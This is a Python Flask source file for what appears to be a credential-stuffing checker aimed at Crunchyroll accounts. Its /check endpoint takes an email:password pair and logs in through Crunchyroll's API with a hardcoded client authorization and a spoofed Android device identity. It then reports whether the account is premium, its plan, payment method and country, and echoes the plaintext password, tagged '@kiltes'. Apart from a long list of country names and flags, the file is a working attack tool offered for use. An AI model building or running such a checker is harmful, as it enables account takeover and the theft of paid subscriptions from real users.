from flask import Flask, request, jsonify
import requests
import json
import urllib.parse
import uuid

# Initialize Flask app
app = Flask(__name__)

# Full Country codes dictionary with flags
country_codes = {
    "AF": "Afghanistan ğŸ‡¦ğŸ‡«", "AX": "Ã…land Islands ğŸ‡¦ğŸ‡½", "AL": "Albania ğŸ‡¦ğŸ‡±", "DZ": "Algeria ğŸ‡©ğŸ‡¿",
    "AS": "American Samoa ğŸ‡¦ğŸ‡¸", "AD": "Andorra ğŸ‡¦ğŸ‡©", "AO": "Angola ğŸ‡¦ğŸ‡´", "AI": "Anguilla ğŸ‡¦ğŸ‡®",
    "AQ": "Antarctica ğŸ‡¦ğŸ‡¶", "AG": "Antigua and Barbuda ğŸ‡¦ğŸ‡¬", "AR": "Argentina ğŸ‡¦ğŸ‡·", "AM": "Armenia ğŸ‡¦ğŸ‡²",
    "AW": "Aruba ğŸ‡¦ğŸ‡¼", "AU": "Australia ğŸ‡¦ğŸ‡º", "AT": "Austria ğŸ‡¦ğŸ‡¹", "AZ": "Azerbaijan ğŸ‡¦ğŸ‡¿",
    "BS": "Bahamas ğŸ‡§ğŸ‡¸", "BH": "Bahrain ğŸ‡§ğŸ‡­", "BD": "Bangladesh ğŸ‡§ğŸ‡©", "BB": "Barbados ğŸ‡§ğŸ‡§",
    "BY": "Belarus ğŸ‡§ğŸ‡¾", "BE": "Belgium ğŸ‡§ğŸ‡ª", "BZ": "Belize ğŸ‡§ğŸ‡¿", "BJ": "Benin ğŸ‡§ğŸ‡¯",
    "BM": "Bermuda ğŸ‡§ğŸ‡²", "BT": "Bhutan ğŸ‡§ğŸ‡¹", "BO": "Bolivia ğŸ‡§ğŸ‡´", "BA": "Bosnia and Herzegovina ğŸ‡§ğŸ‡¦",
    "BW": "Botswana ğŸ‡§ğŸ‡¼", "BV": "Bouvet Island ğŸ‡§ğŸ‡»", "BR": "Brazil ğŸ‡§ğŸ‡·", "IO": "British Indian Ocean Territory ğŸ‡®ğŸ‡´",
    "BN": "Brunei Darussalam ğŸ‡§ğŸ‡³", "BG": "Bulgaria ğŸ‡§ğŸ‡¬", "BF": "Burkina Faso ğŸ‡§ğŸ‡«", "BI": "Burundi ğŸ‡§ğŸ‡®",
    "CV": "Cabo Verde ğŸ‡¨ğŸ‡»", "KH": "Cambodia ğŸ‡°ğŸ‡­", "CM": "Cameroon ğŸ‡¨ğŸ‡²", "CA": "Canada ğŸ‡¨ğŸ‡¦",
    "KY": "Cayman Islands ğŸ‡°ğŸ‡¾", "CF": "Central African Republic ğŸ‡¨ğŸ‡«", "TD": "Chad ğŸ‡¹ğŸ‡©", "CL": "Chile ğŸ‡¨ğŸ‡±",
    "CN": "China ğŸ‡¨ğŸ‡³", "CX": "Christmas Island ğŸ‡¨ğŸ‡½", "CC": "Cocos (Keeling) Islands ğŸ‡¨ğŸ‡¨", "CO": "Colombia ğŸ‡¨ğŸ‡´",
    "KM": "Comoros ğŸ‡°ğŸ‡²", "CG": "Congo ğŸ‡¨ğŸ‡¬", "CD": "Congo (DRC) ğŸ‡¨ğŸ‡©", "CK": "Cook Islands ğŸ‡¨ğŸ‡°",
    "CR": "Costa Rica ğŸ‡¨ğŸ‡·", "CI": "CÃ´te d'Ivoire ğŸ‡¨ğŸ‡®", "HR": "Croatia ğŸ‡­ğŸ‡·", "CU": "Cuba ğŸ‡¨ğŸ‡º",
    "CW": "CuraÃ§ao ğŸ‡¨ğŸ‡¼", "CY": "Cyprus ğŸ‡¨ğŸ‡¾", "CZ": "Czechia ğŸ‡¨ğŸ‡¿", "DK": "Denmark ğŸ‡©ğŸ‡°",
    "DJ": "Djibouti ğŸ‡©ğŸ‡¯", "DM": "Dominica ğŸ‡©ğŸ‡²", "DO": "Dominican Republic ğŸ‡©ğŸ‡´", "EC": "Ecuador ğŸ‡ªğŸ‡¨",
    "EG": "Egypt ğŸ‡ªğŸ‡¬", "SV": "El Salvador ğŸ‡¸ğŸ‡»", "GQ": "Equatorial Guinea ğŸ‡¬ğŸ‡¶", "ER": "Eritrea ğŸ‡ªğŸ‡·",
    "EE": "Estonia ğŸ‡ªğŸ‡ª", "SZ": "Eswatini ğŸ‡¸ğŸ‡¿", "ET": "Ethiopia ğŸ‡ªğŸ‡¹", "FK": "Falkland Islands ğŸ‡«ğŸ‡°",
    "FO": "Faroe Islands ğŸ‡«ğŸ‡´", "FJ": "Fiji ğŸ‡«ğŸ‡¯", "FI": "Finland ğŸ‡«ğŸ‡®", "FR": "France ğŸ‡«ğŸ‡·",
    "GF": "French Guiana ğŸ‡¬ğŸ‡«", "PF": "French Polynesia ğŸ‡µğŸ‡«", "TF": "French Southern Territories ğŸ‡¹ğŸ‡«", "GA": "Gabon ğŸ‡¬ğŸ‡¦",
    "GM": "Gambia ğŸ‡¬ğŸ‡²", "GE": "Georgia ğŸ‡¬ğŸ‡ª", "DE": "Germany ğŸ‡©ğŸ‡ª", "GH": "Ghana ğŸ‡¬ğŸ‡­",
    "GI": "Gibraltar ğŸ‡¬ğŸ‡®", "GR": "Greece ğŸ‡¬ğŸ‡·", "GL": "Greenland ğŸ‡¬ğŸ‡±", "GD": "Grenada ğŸ‡¬ğŸ‡©",
    "GP": "Guadeloupe ğŸ‡¬ğŸ‡µ", "GU": "Guam ğŸ‡¬ğŸ‡º", "GT": "Guatemala ğŸ‡¬ğŸ‡¹", "GG": "Guernsey ğŸ‡¬ğŸ‡¬",
    "GN": "Guinea ğŸ‡¬ğŸ‡³", "GW": "Guinea-Bissau ğŸ‡¬ğŸ‡¼", "GY": "Guyana ğŸ‡¬ğŸ‡¾", "HT": "Haiti ğŸ‡­ğŸ‡¹",
    "HM": "Heard Island and McDonald Islands ğŸ‡­ğŸ‡²", "VA": "Vatican City ğŸ‡»ğŸ‡¦", "HN": "Honduras ğŸ‡­ğŸ‡³", "HK": "Hong Kong ğŸ‡­ğŸ‡°",
    "HU": "Hungary ğŸ‡­ğŸ‡º", "IS": "Iceland ğŸ‡®ğŸ‡¸", "IN": "India ğŸ‡®ğŸ‡³", "ID": "Indonesia ğŸ‡®ğŸ‡©",
    "IR": "Iran ğŸ‡®ğŸ‡·", "IQ": "Iraq ğŸ‡®ğŸ‡¶", "IE": "Ireland ğŸ‡®ğŸ‡ª", "IM": "Isle of Man ğŸ‡®ğŸ‡²",
    "IL": "Israel ğŸ‡®ğŸ‡±", "IT": "Italy ğŸ‡®ğŸ‡¹", "JM": "Jamaica ğŸ‡¯ğŸ‡²", "JP": "Japan ğŸ‡¯ğŸ‡µ",
    "JE": "Jersey ğŸ‡¯ğŸ‡ª", "JO": "Jordan ğŸ‡¯ğŸ‡´", "KZ": "Kazakhstan ğŸ‡°ğŸ‡¿", "KE": "Kenya ğŸ‡°ğŸ‡ª",
    "KI": "Kiribati ğŸ‡°ğŸ‡®", "KP": "Korea (North) ğŸ‡°ğŸ‡µ", "KR": "Korea (South) ğŸ‡°ğŸ‡·", "KW": "Kuwait ğŸ‡°ğŸ‡¼",
    "KG": "Kyrgyzstan ğŸ‡°ğŸ‡¬", "LA": "Lao ğŸ‡±ğŸ‡¦", "LV": "Latvia ğŸ‡±ğŸ‡»", "LB": "Lebanon ğŸ‡±ğŸ‡§",
    "LS": "Lesotho ğŸ‡±ğŸ‡¸", "LR": "Liberia ğŸ‡±ğŸ‡·", "LY": "Libya ğŸ‡±ğŸ‡¾", "LI": "Liechtenstein ğŸ‡±ğŸ‡®",
    "LT": "Lithuania ğŸ‡±ğŸ‡¹", "LU": "Luxembourg ğŸ‡±ğŸ‡º", "MO": "Macao ğŸ‡²ğŸ‡´", "MG": "Madagascar ğŸ‡²ğŸ‡¬",
    "MW": "Malawi ğŸ‡²ğŸ‡¼", "MY": "Malaysia ğŸ‡²ğŸ‡¾", "MV": "Maldives ğŸ‡²ğŸ‡»", "ML": "Mali ğŸ‡²ğŸ‡±",
    "MT": "Malta ğŸ‡²ğŸ‡¹", "MH": "Marshall Islands ğŸ‡²ğŸ‡­", "MQ": "Martinique ğŸ‡²ğŸ‡¶", "MR": "Mauritania ğŸ‡²ğŸ‡·",
    "MU": "Mauritius ğŸ‡²ğŸ‡º", "YT": "Mayotte ğŸ‡¾ğŸ‡¹", "MX": "Mexico ğŸ‡²ğŸ‡½", "FM": "Micronesia ğŸ‡«ğŸ‡²",
    "MD": "Moldova ğŸ‡²ğŸ‡©", "MC": "Monaco ğŸ‡²ğŸ‡¨", "MN": "Mongolia ğŸ‡²ğŸ‡³", "ME": "Montenegro ğŸ‡²ğŸ‡ª",
    "MS": "Montserrat ğŸ‡²ğŸ‡¸", "MA": "Morocco ğŸ‡²ğŸ‡¦", "MZ": "Mozambique ğŸ‡²ğŸ‡¿", "MM": "Myanmar ğŸ‡²ğŸ‡²",
    "NA": "Namibia ğŸ‡³ğŸ‡¦", "NR": "Nauru ğŸ‡³ğŸ‡·", "NP": "Nepal ğŸ‡³ğŸ‡µ", "NL": "Netherlands ğŸ‡³ğŸ‡±",
    "NC": "New Caledonia ğŸ‡³ğŸ‡¨", "NZ": "New Zealand ğŸ‡³ğŸ‡¿", "NI": "Nicaragua ğŸ‡³ğŸ‡®", "NE": "Niger ğŸ‡³ğŸ‡ª",
    "NG": "Nigeria ğŸ‡³ğŸ‡¬", "NU": "Niue ğŸ‡³ğŸ‡º", "NF": "Norfolk Island ğŸ‡³ğŸ‡«", "MK": "North Macedonia ğŸ‡²ğŸ‡°",
    "MP": "Northern Mariana Islands ğŸ‡²ğŸ‡µ", "NO": "Norway ğŸ‡³ğŸ‡´", "OM": "Oman ğŸ‡´ğŸ‡²", "PK": "Pakistan ğŸ‡µğŸ‡°",
    "PW": "Palau ğŸ‡µğŸ‡¼", "PS": "Palestine ğŸ‡µğŸ‡¸", "PA": "Panama ğŸ‡µğŸ‡¦", "PG": "Papua New Guinea ğŸ‡µğŸ‡¬",
    "PY": "Paraguay ğŸ‡µğŸ‡¾", "PE": "Peru ğŸ‡µğŸ‡ª", "PH": "Philippines ğŸ‡µğŸ‡­", "PN": "Pitcairn Islands ğŸ‡µğŸ‡³",
    "PL": "Poland ğŸ‡µğŸ‡±", "PT": "Portugal ğŸ‡µğŸ‡¹", "PR": "Puerto Rico ğŸ‡µğŸ‡·", "QA": "Qatar ğŸ‡¶ğŸ‡¦",
    "RE": "RÃ©union ğŸ‡·ğŸ‡ª", "RO": "Romania ğŸ‡·ğŸ‡´", "RU": "Russia ğŸ‡·ğŸ‡º", "RW": "Rwanda ğŸ‡·ğŸ‡¼",
    "BL": "Saint BarthÃ©lemy ğŸ‡§ğŸ‡±", "SH": "Saint Helena ğŸ‡¸ğŸ‡­", "KN": "Saint Kitts and Nevis ğŸ‡°ğŸ‡³", "LC": "Saint Lucia ğŸ‡±ğŸ‡¨",
    "MF": "Saint Martin ğŸ‡²ğŸ‡«", "PM": "Saint Pierre and Miquelon ğŸ‡µğŸ‡²", "VC": "Saint Vincent and the Grenadines ğŸ‡»ğŸ‡¨", "WS": "Samoa ğŸ‡¼ğŸ‡¸",
    "SM": "San Marino ğŸ‡¸ğŸ‡²", "ST": "SÃ£o TomÃ© and PrÃ­ncipe ğŸ‡¸ğŸ‡¹", "SA": "Saudi Arabia ğŸ‡¸ğŸ‡¦", "SN": "Senegal ğŸ‡¸ğŸ‡³",
    "RS": "Serbia ğŸ‡·ğŸ‡¸", "SC": "Seychelles ğŸ‡¸ğŸ‡¨", "SL": "Sierra Leone ğŸ‡¸ğŸ‡±", "SG": "Singapore ğŸ‡¸ğŸ‡¬",
    "SX": "Sint Maarten ğŸ‡¸ğŸ‡½", "SK": "Slovakia ğŸ‡¸ğŸ‡°", "SI": "Slovenia ğŸ‡¸ğŸ‡®", "SB": "Solomon Islands ğŸ‡¸ğŸ‡§",
    "SO": "Somalia ğŸ‡¸ğŸ‡´", "ZA": "South Africa ğŸ‡¿ğŸ‡¦", "GS": "South Georgia and the South Sandwich Islands ğŸ‡¬ğŸ‡¸", "SS": "South Sudan ğŸ‡¸ğŸ‡¸",
    "ES": "Spain ğŸ‡ªğŸ‡¸", "LK": "Sri Lanka ğŸ‡±ğŸ‡°", "SD": "Sudan ğŸ‡¸ğŸ‡©", "SR": "Suriname ğŸ‡¸ğŸ‡·",
    "SJ": "Svalbard and Jan Mayen ğŸ‡¸ğŸ‡¯", "SE": "Sweden ğŸ‡¸ğŸ‡ª", "CH": "Switzerland ğŸ‡¨ğŸ‡­", "SY": "Syria ğŸ‡¸ğŸ‡¾",
    "TW": "Taiwan ğŸ‡¹ğŸ‡¼", "TJ": "Tajikistan ğŸ‡¹ğŸ‡¯", "TZ": "Tanzania ğŸ‡¹ğŸ‡¿", "TH": "Thailand ğŸ‡¹ğŸ‡­",
    "TL": "Timor-Leste ğŸ‡¹ğŸ‡±", "TG": "Togo ğŸ‡¹ğŸ‡¬", "TK": "Tokelau ğŸ‡¹ğŸ‡°", "TO": "Tonga ğŸ‡¹ğŸ‡´",
    "TT": "Trinidad and Tobago ğŸ‡¹ğŸ‡¹", "TN": "Tunisia ğŸ‡¹ğŸ‡³", "TR": "Turkey ğŸ‡¹ğŸ‡·", "TM": "Turkmenistan ğŸ‡¹ğŸ‡²",
    "TC": "Turks and Caicos Islands ğŸ‡¹ğŸ‡¨", "TV": "Tuvalu ğŸ‡¹ğŸ‡»", "UG": "Uganda ğŸ‡ºğŸ‡¬", "UA": "Ukraine ğŸ‡ºğŸ‡¦",
    "AE": "United Arab Emirates ğŸ‡¦ğŸ‡ª", "GB": "United Kingdom ğŸ‡¬ğŸ‡§", "US": "United States ğŸ‡ºğŸ‡¸", "UM": "United States Minor Outlying Islands ğŸ‡ºğŸ‡²",
    "UY": "Uruguay ğŸ‡ºğŸ‡¾", "UZ": "Uzbekistan ğŸ‡ºğŸ‡¿", "VU": "Vanuatu ğŸ‡»ğŸ‡º", "VE": "Venezuela ğŸ‡»ğŸ‡ª",
    "VN": "Vietnam ğŸ‡»ğŸ‡³", "VG": "British Virgin Islands ğŸ‡»ğŸ‡¬", "VI": "U.S. Virgin Islands ğŸ‡»ğŸ‡®", "WF": "Wallis and Futuna ğŸ‡¼ğŸ‡«",
    "EH": "Western Sahara ğŸ‡ªğŸ‡­", "YE": "Yemen ğŸ‡¾ğŸ‡ª", "ZM": "Zambia ğŸ‡¿ğŸ‡²", "ZW": "Zimbabwe ğŸ‡¿ğŸ‡¼"
}

@app.route('/check', methods=['GET'])
def check_credentials():
    # Extract 'crunchy' query parameter (email:password)
    crunchy = request.args.get('crunchy')
    if not crunchy or ':' not in crunchy:
        return jsonify({"error": "Invalid format. Use crunchy=email:password"}), 400

    email, password = crunchy.split(':', 1)

    # Generate unique device ID (GUID)
    guid = str(uuid.uuid4())

    # URL encode username and password
    em = urllib.parse.quote_plus(email)
    ps = urllib.parse.quote_plus(password)

    # Login request
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    content_data = f"username={em}&password={ps}&grant_type=password&scope=offline_access&device_id={guid}&device_name=SM-G988N&device_type=samsung%20SM-G977N"
    headers = {
        'Host': 'beta-api.crunchyroll.com',
        'authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
        'etp-anonymous-id': '39cf8dfa-efff-49fb-8125-45cfb5cdcd7e',
        'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
        'accept-encoding': 'gzip',
        'content-length': str(len(content_data))
    }

    response = requests.post(url, data=content_data, headers=headers)
    response_text = response.text

    try:
        json_response = response.json()
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON response from server"}), 500

    # Check for login success or failure
    if response.status_code == 401:
        return jsonify({"status": "Login failed"}), 401

    # Extract tokens and account_id
    tk = json_response.get('access_token', '')
    account_id = json_response.get('account_id', '')

    # Get account info
    url_me = 'https://beta-api.crunchyroll.com/accounts/v1/me'
    headers_me = {
        'Host': 'beta-api.crunchyroll.com',
        'authorization': f'Bearer {tk}',
        'etp-anonymous-id': '80de41e3-7f84-47e6-9f6a-b611138613ed',
        'accept-encoding': 'gzip',
        'user-agent': 'Crunchyroll/3.54.0-s Android/9 okhttp/4.12.0'
    }

    response_me = requests.get(url_me, headers=headers_me)
    try:
        json_response_me = response_me.json()
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON response from server"}), 500

    # Extract external_id
    external_id = json_response_me.get('external_id', '')

    # Get subscription benefits
    url_benefits = f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits'
    headers_benefits = {
        'Host': 'beta-api.crunchyroll.com',
        'authorization': f'Bearer {tk}',
        'etp-anonymous-id': '80de41e3-7f84-47e6-9f6a-b611138613ed',
        'accept-encoding': 'gzip',
        'user-agent': 'Crunchyroll/3.54.0-s Android/9 okhttp/4.12.0'
    }

    response_benefits = requests.get(url_benefits, headers=headers_benefits)
    response_benefits_text = response_benefits.text

    try:
        json_response_benefits = response_benefits.json()
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON response from server"}), 500

    # Check for access forbidden (403)
    if response_benefits.status_code == 403:
        return jsonify({"status": "Access forbidden (403)"}), 403

    # Determine subscription status
    is_free = (
        "subscription.not_found" in response_benefits_text or
        "Subscription Not Found" in response_benefits_text or
        "\"subscription_country\":\"" not in response_benefits_text or
        "total\":0," in response_benefits_text
    )

    is_subscriber = (
        "subscription.not_found\"" not in response_benefits_text and
        "\"subscription_country\":\"" in response_benefits_text and
        "total\":0," not in response_benefits_text
    )

    if is_subscriber:
        subscription_status = "? Premium"
    elif is_free:
        subscription_status = "? Free User"
    else:
        subscription_status = "Unable to determine subscription status"

    # Get subscription country from subscription details
    country_code = json_response_benefits.get('subscription_country', '')
    country = country_codes.get(country_code, country_code if country_code else "Unknown")

    # Fallback: Extract country from account info if not found in subscription details
    account_country = json_response_me.get('country', '')
    if not country or country == "Unknown":
        country = country_codes.get(account_country, account_country if account_country else "Unknown")

    # Extract payment method
    payment_method = "Unknown"
    if 'source":"' in response_benefits_text:
        start_index = response_benefits_text.find('source":"') + len('source":"')
        end_index = response_benefits_text.find('"', start_index)
        payment_method = response_benefits_text[start_index:end_index].strip()

    # Extract plan details and improve benefit extraction
    benefits_list = json_response_benefits.get('benefits', [])
    benefit_values = [benefit.get('benefit', '') for benefit in benefits_list]

    # Extract concurrent streams for plan
    st_list = [benefit for benefit in benefit_values if 'concurrent_streams.' in benefit]
    st = ''.join(st_list).replace(' ', '')

    # Map 'st' to plan names
    plan_translation = {
        "concurrent_streams.4": "MEGA FAN MEMBER",
        "concurrent_streams.1": "FAN MEMBER",
        "concurrent_streams.6": "ULTIMATE FAN MEMBER"
    }

    # Improved mapping and fallback if not found
    plan_name = plan_translation.get(st, st.replace('concurrent_streams.', '').capitalize() if st else "Unknown Plan")

    # Build result as JSON response
    result = {
        "subscription_status": subscription_status,
        "email": email,
        "password": password,
        "plan": plan_name,
        "payment_method": payment_method,
        "country": country,
        "by": "@kiltes"
    }

    return jsonify(result), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
